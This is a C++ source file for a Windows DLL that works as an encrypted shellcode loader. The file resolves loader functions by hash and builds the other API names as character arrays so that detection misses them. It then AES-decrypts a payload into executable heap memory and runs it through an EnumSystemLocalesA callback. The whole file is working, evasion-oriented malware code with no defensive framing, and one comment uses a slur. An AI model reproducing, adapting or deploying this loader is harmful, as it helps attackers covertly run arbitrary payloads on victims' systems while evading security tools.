#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <bcrypt.h>
#include <functional>
#include <winternl.h>

#include "GetProcAddressWithHash.hpp"

#ifdef LOADER_EXPORTS
#define LOADER_API __declspec(dllexport)
#else
#define LOADER_API __declspec(dllimport)
#endif

#define LDRLOADDLL_HASH					0xbdbf9c13
#define LDRGETPROCADDRESS_HASH			0x5ed941b5

#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
#define FILL_STRING_WITH_BUF(string, buffer) \
	string.Length = sizeof(buffer); \
	string.MaximumLength = string.Length; \
	string.Buffer = (PCHAR)buffer

typedef NTSTATUS(WINAPI* LDRLOADDLL)(PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
typedef NTSTATUS(WINAPI* LDRGETPROCADDRESS)(HMODULE, PANSI_STRING, WORD, PVOID*);

typedef NTSTATUS(WINAPI* BCRYPTOPENALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTGETPROPERTY)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTSETPROPERTY)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTGENERATESYMMETRICKEY)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTDECRYPT)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTCLOSEALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTDESTROYKEY)(BCRYPT_KEY_HANDLE);

typedef LPVOID(WINAPI* HEAPALLOC)(HANDLE, DWORD, SIZE_T);
typedef HANDLE(WINAPI* GETPROCESSHEAP)();
typedef HANDLE(WINAPI* HEAPCREATE)(DWORD, SIZE_T, SIZE_T);
typedef BOOL(WINAPI* ENUMSYSTEMLOCALESA)(LOCALE_ENUMPROCA, DWORD);
typedef BOOL(WINAPI* HEAPFREE)(HANDLE, DWORD, LPVOID);

extern "C" LOADER_API
void Run(PBYTE pbCipherText, DWORD cbCipherText)
{
    BCRYPT_ALG_HANDLE       hAesAlg = nullptr;
    BCRYPT_KEY_HANDLE       hKey = nullptr;
    NTSTATUS                status = STATUS_UNSUCCESSFUL;
    DWORD                   cbRawData = 0,
					        cbData = 0,
					        cbKeyObject = 0,
					        cbBlockLen = 0;
    PBYTE                   pbRawData = nullptr,
					        pbKeyObject = nullptr,
					        pbIV = nullptr;
    BYTE                    rgbIV[16] = {};
    BYTE                    rgbAES128Key[16] = {};

    HANDLE                  cryptLib,
							library;

    // Function pointers
    LDRLOADDLL                      pLdrLoadDll = nullptr;
    LDRGETPROCADDRESS               pLdrGetProcAddress = nullptr;

    BCRYPTOPENALGORITHMPROVIDER     pBCryptOpenAlgorithmProvider = nullptr;
    BCRYPTGETPROPERTY               pBCryptGetProperty = nullptr;
    BCRYPTSETPROPERTY               pBCryptSetProperty = nullptr;
    BCRYPTGENERATESYMMETRICKEY      pBCryptGenerateSymmetricKey = nullptr;
    BCRYPTDECRYPT                   pBCryptDecrypt = nullptr;
    BCRYPTCLOSEALGORITHMPROVIDER    pBCryptCloseAlgorithmProvider = nullptr;
    BCRYPTDESTROYKEY                pBCryptDestroyKey = nullptr;

    HEAPALLOC                       pHeapAlloc = nullptr;
    GETPROCESSHEAP                  pGetProcessHeap = nullptr;
    HEAPCREATE                      pHeapCreate = nullptr;
    ENUMSYSTEMLOCALESA              pEnumSystemLocalesA = nullptr;
    HEAPFREE                        pHeapFree = nullptr;

    // Retard strings
    UNICODE_STRING  uString = { 0 };
    STRING          aString = { 0 };

    WCHAR sBcrypt[] = { 'B', 'c', 'r', 'y', 'p', 't', '.', 'd', 'l', 'l' };
    WCHAR sKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l' };

    BYTE sBCryptOpenAlgorithmProvider[] = { 'B', 'C', 'r', 'y', 'p', 't', 'O', 'p', 'e', 'n', 'A', 'l', 'g', 'o', 'r', 'i', 't', 'h', 'm', 'P', 'r', 'o', 'v', 'i', 'd', 'e', 'r' };
    BYTE sBCryptGetProperty[] = { 'B', 'C', 'r', 'y', 'p', 't', 'G', 'e', 't', 'P', 'r', 'o', 'p', 'e', 'r', 't', 'y' };
    BYTE sBCryptSetProperty[] = { 'B', 'C', 'r', 'y', 'p', 't', 'S', 'e', 't', 'P', 'r', 'o', 'p', 'e', 'r', 't', 'y' };
    BYTE sBCryptGenerateSymmetricKey[] = { 'B', 'C', 'r', 'y', 'p', 't', 'G', 'e', 'n', 'e', 'r', 'a', 't', 'e', 'S', 'y', 'm', 'm', 'e', 't', 'r', 'i', 'c', 'K', 'e', 'y' };
    BYTE sBCryptDecrypt[] = { 'B', 'C', 'r', 'y', 'p', 't', 'D', 'e', 'c', 'r', 'y', 'p', 't' };
    BYTE sBCryptCloseAlgorithmProvider[] = { 'B', 'C', 'r', 'y', 'p', 't', 'C', 'l', 'o', 's', 'e', 'A', 'l', 'g', 'o', 'r', 'i', 't', 'h', 'm', 'P', 'r', 'o', 'v', 'i', 'd', 'e', 'r' };
    BYTE sBCryptDestroyKey[] = { 'B', 'C', 'r', 'y', 'p', 't', 'D', 'e', 's', 't', 'r', 'o', 'y', 'K', 'e', 'y' };

    BYTE sHeapAlloc[] = { 'H', 'e', 'a', 'p', 'A', 'l', 'l', 'o', 'c' };
    BYTE sGetProcessHeap[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'H', 'e', 'a', 'p' };
    BYTE SHeapCreate[] = { 'H', 'e', 'a', 'p', 'C', 'r', 'e', 'a', 't', 'e' };
    BYTE sEnumSystemLocalesA[] = { 'E', 'n', 'u', 'm', 'S', 'y', 's', 't', 'e', 'm', 'L', 'o', 'c', 'a', 'l', 'e', 's', 'A' };
    BYTE sHeapFree[] = { 'H', 'e', 'a', 'p', 'F', 'r', 'e', 'e' };

    // -------

	///
	// STEP 1: locate all the required functions
	///

    pLdrLoadDll = (LDRLOADDLL)GetProcAddressWithHash(LDRLOADDLL_HASH);
    pLdrGetProcAddress = (LDRGETPROCADDRESS)GetProcAddressWithHash(LDRGETPROCADDRESS_HASH);

    uString.Buffer = sBcrypt;
    uString.MaximumLength = sizeof(sBcrypt);
    uString.Length = sizeof(sBcrypt);
    pLdrLoadDll(nullptr, 0, &uString, &cryptLib);

    FILL_STRING_WITH_BUF(aString, sBCryptOpenAlgorithmProvider);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptOpenAlgorithmProvider);

    FILL_STRING_WITH_BUF(aString, sBCryptGetProperty);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptGetProperty);

    FILL_STRING_WITH_BUF(aString, sBCryptSetProperty);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptSetProperty);

    FILL_STRING_WITH_BUF(aString, sBCryptGenerateSymmetricKey);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptGenerateSymmetricKey);

    FILL_STRING_WITH_BUF(aString, sBCryptDecrypt);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptDecrypt);

    FILL_STRING_WITH_BUF(aString, sBCryptCloseAlgorithmProvider);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptCloseAlgorithmProvider);

    FILL_STRING_WITH_BUF(aString, sBCryptDestroyKey);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptDestroyKey);

    if (!pBCryptOpenAlgorithmProvider || !pBCryptGetProperty || !pBCryptSetProperty || !pBCryptGenerateSymmetricKey ||
        !pBCryptDecrypt || !pBCryptCloseAlgorithmProvider || !pBCryptDestroyKey)
    {
        goto Cleanup;
    }

    uString.Buffer = sKernel32;
    uString.MaximumLength = sizeof(sKernel32);
    uString.Length = sizeof(sKernel32);

    pLdrLoadDll(nullptr, 0, &uString, &library);

    FILL_STRING_WITH_BUF(aString, sHeapAlloc);
    pLdrGetProcAddress((HMODULE)library, &aString, 0, (PVOID*)&pHeapAlloc);

    FILL_STRING_WITH_BUF(aString, sGetProcessHeap);
    pLdrGetProcAddress((HMODULE)library, &aString, 0, (PVOID*)&pGetProcessHeap);

    FILL_STRING_WITH_BUF(aString, SHeapCreate);
    pLdrGetProcAddress((HMODULE)library, &aString, 0, (PVOID*)&pHeapCreate);

    FILL_STRING_WITH_BUF(aString, sEnumSystemLocalesA);
    pLdrGetProcAddress((HMODULE)library, &aString, 0, (PVOID*)&pEnumSystemLocalesA);

    FILL_STRING_WITH_BUF(aString, sHeapFree);
    pLdrGetProcAddress((HMODULE)library, &aString, 0, (PVOID*)&pHeapFree);

    if (!pHeapAlloc || !pGetProcessHeap || !pHeapCreate || !pEnumSystemLocalesA || !pHeapFree)
    {
        goto Cleanup;
    }


    ///
	// STEP 2: Decrypt
	///

	// Copy key and iv from the last 32 bytes of cipher text
    memcpy(rgbAES128Key, &pbCipherText[cbCipherText - 32], 16);
    memcpy(rgbIV, &pbCipherText[cbCipherText - 16], 16);

    // Open an algorithm handle.
    if (!NT_SUCCESS(status = pBCryptOpenAlgorithmProvider(
        &hAesAlg,
        BCRYPT_AES_ALGORITHM,
        NULL,
        0)))
    {
        goto Cleanup;
    }

    // Calculate the size of the buffer to hold the KeyObject.
    if (!NT_SUCCESS(status = pBCryptGetProperty(
        hAesAlg,
        BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbKeyObject,
        sizeof(DWORD),
        &cbData,
        0)))
    {
        goto Cleanup;
    }

    // Allocate the key object on the heap.;
    pbKeyObject = (PBYTE)pHeapAlloc(pGetProcessHeap(), 0, cbKeyObject);
    if (nullptr == pbKeyObject)
    {
        goto Cleanup;
    }

    // Calculate the block length for the IV.
    if (!NT_SUCCESS(status = pBCryptGetProperty(
        hAesAlg,
        BCRYPT_BLOCK_LENGTH,
        (PBYTE)&cbBlockLen,
        sizeof(DWORD),
        &cbData,
        0)))
    {
        goto Cleanup;
    }

    // Determine whether the cbBlockLen is not longer than the IV length.
    if (cbBlockLen > sizeof(rgbIV))
    {
        goto Cleanup;
    }

    // Allocate a buffer for the IV. The buffer is consumed during the 
    // encrypt/decrypt process.
    pbIV = (PBYTE)pHeapAlloc(pGetProcessHeap(), 0, cbBlockLen);
    if (nullptr == pbIV)
    {
        goto Cleanup;
    }

    memcpy(pbIV, rgbIV, cbBlockLen);

    if (!NT_SUCCESS(status = pBCryptSetProperty(
        hAesAlg,
        BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC),
        0)))
    {
        goto Cleanup;
    }

    // Generate the key from supplied input key bytes.
    if (!NT_SUCCESS(status = pBCryptGenerateSymmetricKey(
        hAesAlg,
        &hKey,
        pbKeyObject,
        cbKeyObject,
        (PBYTE)rgbAES128Key,
        sizeof(rgbAES128Key),
        0)))
    {
        goto Cleanup;
    }

    // Get the output buffer size.
    if (!NT_SUCCESS(status = pBCryptDecrypt(
        hKey,
        pbCipherText,
        cbCipherText - 32,
        NULL,
        pbIV,
        cbBlockLen,
        NULL,
        0,
        &cbRawData,
        BCRYPT_BLOCK_PADDING)))
    {
        goto Cleanup;
    }

    pbRawData = (PBYTE)pHeapAlloc(
        pHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0),
        0, cbRawData);
    if (nullptr == pbRawData)
    {
        goto Cleanup;
    }

    if (!NT_SUCCESS(status = pBCryptDecrypt(
        hKey,
        pbCipherText,
        cbCipherText - 32,
        NULL,
        pbIV,
        cbBlockLen,
        pbRawData,
        cbRawData,
        &cbRawData,
        BCRYPT_BLOCK_PADDING)))
    {
        goto Cleanup;
    }

    ///
	// STEP 3: Run shell code
	///

    pEnumSystemLocalesA((LOCALE_ENUMPROCA)pbRawData, 0);

Cleanup:

    if (hAesAlg)
        pBCryptCloseAlgorithmProvider(hAesAlg, 0);

    if (hKey)
       pBCryptDestroyKey(hKey);

    if (pbCipherText)
        pHeapFree(pGetProcessHeap(), 0, pbCipherText);

    if (pbRawData)
        pHeapFree(pGetProcessHeap(), 0, pbRawData);

    if (pbKeyObject)
        pHeapFree(pGetProcessHeap(), 0, pbKeyObject);

    if (pbIV)
        pHeapFree(pGetProcessHeap(), 0, pbIV);
}
